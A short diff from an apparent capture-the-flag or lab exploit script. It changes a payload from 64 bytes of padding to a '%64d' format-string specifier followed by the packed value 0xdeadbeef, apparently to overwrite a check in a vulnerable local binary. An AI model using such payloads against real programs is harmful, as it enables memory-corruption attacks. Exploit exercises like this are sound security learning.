@@ -13,7 +13,7 @@ def main():
     currEnv = os.environ.copy()
     absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
     magicNum = pack("I", 0xdeadbeef)  # 0xdeadbeef
-    payload = "H" * 64 + magicNum
+    payload = "%64d" + magicNum
     commandList = []
 
     # VERIFY FILE    
